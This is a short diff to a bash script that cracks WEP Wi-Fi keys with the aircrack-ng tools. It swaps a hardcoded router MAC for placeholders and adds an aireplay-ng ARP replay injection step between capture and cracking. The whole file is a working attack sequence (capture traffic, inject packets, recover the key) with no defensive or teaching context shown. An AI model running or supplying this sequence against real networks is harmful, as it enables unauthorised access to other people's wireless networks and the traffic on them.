@@ -1,4 +1,5 @@
 #!/bin/bash
 airodump-ng wlan0
-airodump-ng --bssid 6C:72:20:12:6F:C8 -c 1 -w WEPcrack wlan0
+airodump-ng --bssid <routerMAC> -c 1 -w WEPcrack <interface>
+aireplay-ng -3 -b <routerMAC> -h <clientMAC> <interface> -x 1024
 aircrack-ng WEPcrack.cap
